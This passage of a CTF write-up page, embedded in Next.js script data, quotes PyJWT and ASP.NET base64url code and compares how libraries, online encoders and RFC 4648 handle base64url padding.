\",[\"$\",\"a\",\"a-0\",{\"href\":\"https://github.com/jpadilla/pyjwt/blob/master/jwt/api_jws.py#L194\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"api_jws.decode_complete(...)\"}]}]]}]\n44:T73f,"])</script><script>self.__next_f.push([1,"    def decode_complete(\n        self,\n        jwt: str | bytes,\n        key: AllowedPublicKeys | PyJWK | str | bytes = \"\",\n        algorithms: Sequence[str] | None = None,\n        options: SigOptions | None = None,\n        detached_payload: bytes | None = None,\n        **kwargs: dict[str, Any],\n    ) -\u003e dict[str, Any]:\n        if kwargs:\n            warnings.warn(\n                \"passing additional kwargs to decode_complete() is deprecated \"\n                \"and will be removed in pyjwt version 3. \"\n                f\"Unsupported kwargs: {tuple(kwargs.keys())}\",\n                RemovedInPyjwt3Warning,\n                stacklevel=2,\n            )\n        merged_options: SigOptions\n        if options is None:\n            merged_options = self.options\n        else:\n            merged_options = {**self.options, **options}\n\n        verify_signature = merged_options[\"verify_signature\"]\n\n        if verify_signature and not algorithms and not isinstance(key, PyJWK):\n            raise DecodeError(\n                'It is required that you pass in a value for the \"algorithms\" argument when calling decode().'\n            )\n\n        payload, signing_input, header, signature = self._load(jwt)\n\n        if header.get(\"b64\", True) is False:\n            if detached_payload is None:\n                raise DecodeError(\n                    'It is required that you pass in a value for the \"detached_payload\" argument to decode a message having the b64 header set to false.'\n                )\n            payload = detached_payload\n            signing_input = b\".\".join([signing_input.rsplit(b\".\", 1)[0], payload])\n\n        if verify_signature:\n            self._verify_signature(signing_input, header, signature, key, algorithms)\n\n        return {\n            \"payload\": payload,\n            \"header\": header,\n            \"signature\": signature,\n        }"])</script><script>self.__next_f.push([1,"2f:[\"$\",\"$Le\",\"pre-9\",{\"className\":\"my-2\",\"children\":\"$44\",\"language\":\"py\"}]\n30:[\"$\",\"p\",\"p-21\",{\"children\":[\"which calls \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"_load(...)\"}]]}]\n45:T5a0,"])</script><script>self.__next_f.push([1,"    def _load(self, jwt: str | bytes) -\u003e tuple[bytes, bytes, dict[str, Any], bytes]:\n        if isinstance(jwt, str):\n            jwt = jwt.encode(\"utf-8\")\n\n        if not isinstance(jwt, bytes):\n            raise DecodeError(f\"Invalid token type. Token must be a {bytes}\")\n\n        try:\n            signing_input, crypto_segment = jwt.rsplit(b\".\", 1)\n            header_segment, payload_segment = signing_input.split(b\".\", 1)\n        except ValueError as err:\n            raise DecodeError(\"Not enough segments\") from err\n\n        try:\n            header_data = base64url_decode(header_segment)\n        except (TypeError, binascii.Error) as err:\n            raise DecodeError(\"Invalid header padding\") from err\n\n        try:\n            header: dict[str, Any] = json.loads(header_data)\n        except ValueError as e:\n            raise DecodeError(f\"Invalid header string: {e}\") from e\n\n        if not isinstance(header, dict):\n            raise DecodeError(\"Invalid header string: must be a json object\")\n\n        try:\n            payload = base64url_decode(payload_segment)\n        except (TypeError, binascii.Error) as err:\n            raise DecodeError(\"Invalid payload padding\") from err\n\n        try:\n            signature = base64url_decode(crypto_segment)\n        except (TypeError, binascii.Error) as err:\n            raise DecodeError(\"Invalid crypto padding\") from err\n\n        return (payload, signing_input, header, signature)"])</script><script>self.__next_f.push([1,"31:[\"$\",\"$Le\",\"pre-10\",{\"className\":\"my-2\",\"children\":\"$45\",\"language\":\"py\"}]\n32:[\"$\",\"p\",\"p-22\",{\"children\":[\"which finally calls \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://github.com/jpadilla/pyjwt/blob/master/jwt/utils.py#L25\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"base64url_decode(...)\"}]}],\":\"]}]\n33:[\"$\",\"$Le\",\"pre-11\",{\"className\":\"my-2\",\"children\":\"def base64url_decode(input: Union[bytes, str]) -\u003e bytes:\\n    input_bytes = force_bytes(input)\\n\\n    rem = len(input_bytes) % 4\\n\\n    if rem \u003e 0:\\n        input_bytes += b\\\"=\\\" * (4 - rem)\\n\\n    return base64.urlsafe_b64decode(input_bytes)\\n\\n\\ndef base64url_encode(input: bytes) -\u003e bytes:\\n    return base64.urlsafe_b64encode(input).replace(b\\\"=\\\", b\\\"\\\")\",\"language\":\"py\"}]\n34:[\"$\",\"p\",\"p-23\",{\"children\":[\"which, apart from actually \",[\"$\",\"em\",\"em-0\",{\"children\":\"adding\"}],\" padding to our input, just hooks into the Python \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://docs.python.org/3/library/base64.html#base64.urlsafe_b64decode\",\"children\":[\"standard library \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"urlsafe_b64\"}],\" method\"]}],\". Surprisingly, \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"base64.urlsafe_b64decode()\"}],\" makes no mention of omitting padding characters!\"]}]\n35:[\"$\",\"p\",\"p-24\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/331cebcd-1238-432b-8142-e9998897b7ce\",\"alt\":\"image\"}]}]\n36:[\"$\",\"p\",\"p-25\",{\"children\":[\"Finally, what does the RFC say? According to the linked \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://datatracker.ietf.org/doc/html/rfc4648#section-5\",\"children\":\"RFC 4648 section 5\"}],\",\"]}]\n37:[\"$\",\"p\",\"p-26\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/c06783cc-f3c4-4b7a-a6f5-c3e93f25e449\",\"alt\":\"image\"}]}]\n38:[\"$\",\"p\",\"p-27\",{\"children\":[\"so padding characters \",[\"$\",\"em\",\"em-0\",{\"children\":\"can\"}],\" be skipped? Sometimes?\"]}]\n39:[\"$\",\"p\",\"p-28\",{\"children\":[\"And the padding issue seemingly isn't just an MDN misunderstanding either; if you google \\\"base64 URL encoder\\\", many sites (including the somewhat well-known \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://www.base64encode.org/\",\"children\":\"base64encode.org\"}],\", but also the \",[\"$\",\"a\",\"a-1\",{\"href\":\"https://base64.guru/standards/base64url/encode\",\"children\":\"third result on google\"}],\", this \",[\"$\",\"a\",\"a-2\",{\"href\":\"https://www.npmjs.com/package/base64url\",\"children\":\"npm library\"}],\", and this \",[\"$\",\"a\",\"a-3\",{\"href\":\"https://medium.com/@bagdasaryanaleksandr97/understanding-base64-vs-base64-url-encoding-whats-the-difference-31166755bc26\",\"children\":\"random Medium article I came across\"}],\") will omit padding characters when encoding base64url:\"]}]\n3a:[\"$\",\"img\",\"img-0\",{\"width\":1434,\"height\":895,\"alt\":\"image\",\"src\":\"https://gist.github.com/user-attachments/assets/ac29cd97-1dd4-42ab-b135-fc945920cb99\"}]\n3b:[\"$\",\"p\",\"p-29\",{\"children\":[\"But others, including the \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://simplycalc.com/base64url-encode.php\",\"children\":\"first result that happened to come up on google\"}],\", don't.\"]}]\n3c:[\"$\",\"$Le\",\"pre-12\",{\"className\":\"my-2\",\"children\":\"\u003e\u003e\u003e base64.urlsafe_b64encode(b'aaaaaaa')\\nb'YWFhYWFhYQ=='\",\"language\":\"py\"}]\n3d:[\"$\",\"p\",\"p-30\",{\"children\":[\"Hell, even the C# \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://github.com/dotnet/dotnet/blob/b0f34d51fccc69fd334253924abd8d6853fad7aa/src/aspnetcore/src/Shared/WebEncoders/WebEncoders.cs#L288\",\"children\":\"standard library for ASP.NET\"}],\" seems to drop padding characters when encoding:\"]}]\n46:T772,"])</script><script>self.__next_f.push([1,"    public static int Base64UrlEncode(byte[] input, int offset, char[] output, int outputOffset, int count)\n    {\n        ArgumentNullThrowHelper.ThrowIfNull(input);\n        ArgumentNullThrowHelper.ThrowIfNull(output);\n\n        ValidateParameters(input.Length, nameof(input), offset, count);\n        ArgumentOutOfRangeThrowHelper.ThrowIfNegative(outputOffset);\n\n        var arraySizeRequired = GetArraySizeRequiredToEncode(count);\n        if (output.Length - outputOffset \u003c arraySizeRequired)\n        {\n            throw new ArgumentException(\n                string.Format(\n                    CultureInfo.CurrentCulture,\n                    EncoderResources.WebEncoders_InvalidCountOffsetOrLength,\n                    nameof(count),\n                    nameof(outputOffset),\n                    nameof(output)),\n                nameof(count));\n        }\n\n#if NETCOREAPP\n        return Base64UrlEncode(input.AsSpan(offset, count), output.AsSpan(outputOffset));\n#else\n        // Special-case empty input.\n        if (count == 0)\n        {\n            return 0;\n        }\n\n        // Use base64url encoding with no padding characters. See RFC 4648, Sec. 5.\n\n        // Start with default Base64 encoding.\n        var numBase64Chars = Convert.ToBase64CharArray(input, offset, count, output, outputOffset);\n\n        // Fix up '+' -\u003e '-' and '/' -\u003e '_'. Drop padding characters.\n        for (var i = outputOffset; i - outputOffset \u003c numBase64Chars; i++)\n        {\n            var ch = output[i];\n            if (ch == '+')\n            {\n                output[i] = '-';\n            }\n            else if (ch == '/')\n            {\n                output[i] = '_';\n            }\n            else if (ch == '=')\n            {\n                // We've reached a padding character; truncate the remainder.\n                return i - outputOffset;\n            }\n        }\n\n        return numBase64Chars;\n#endif\n    }"])</script><script>self.__next_f.push([1,"3e:[\"$\",\"$Le\",\"pre-13\",{\"className\":\"my-2\",\"children\":\"$46\",\"language\":\"cs\"}]\n3f:[\"$\",\"p\",\"p-31\",{\"children\":[\"(in C#'s \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://github.com/dotnet/dotnet/blob/b0f34d51fccc69fd334253924abd8d6853fad7aa/src/aspnetcore/src/Shared/WebEncoders/WebEncoders.cs#L119\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"Base64UrlDecode\"}]}],\", a comment says to assume that the input contains no padding characters, though at first glance the method appears to work even if padding exists.)\"]}]\n40:[\"$\",\"p\",\"p-32\",{\"children\":\"All this to say, I think it's a bit strange that there's so much differing behavior around this spec.\"}]\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"title\",\"0\",{\"children\":\"HeroCTF v7 — Revoked (+ Revenge) | kevin.fish\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Your budget request for the new company personnel index has been declined. Instead, the intern has received a very small bonus in exchange for a homemade solution.\"}],[\"$\",\"meta\",\"2\",{\"property\":\"og:title\",\"content\":\"HeroCTF v7 — Revoked (+ Revenge)\"}],[\"$\",\"meta\",\"3\",{\"property\":\"og:description\",\"content\":\"Your budget request for the new company personnel index has been declined. Instead, the intern has received a very small bonus in exchange for a homemade solution.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"twitter:card\",\"content\":\"summary\"}],[\"$\",\"meta\",\"5\",{\"name\":\"twitter:title\",\"content\":\"HeroCTF v7 — Revoked (+ Revenge)\"}],[\"$\",\"meta\",\"6\",{\"name\":\"twitter:description\",\"content\":\"Your budget request for the new company personnel index has been declined. Instead, the intern has received a very small bonus in exchange for a homemade solution.\"}]]\n8:null\n"])</script></body></html>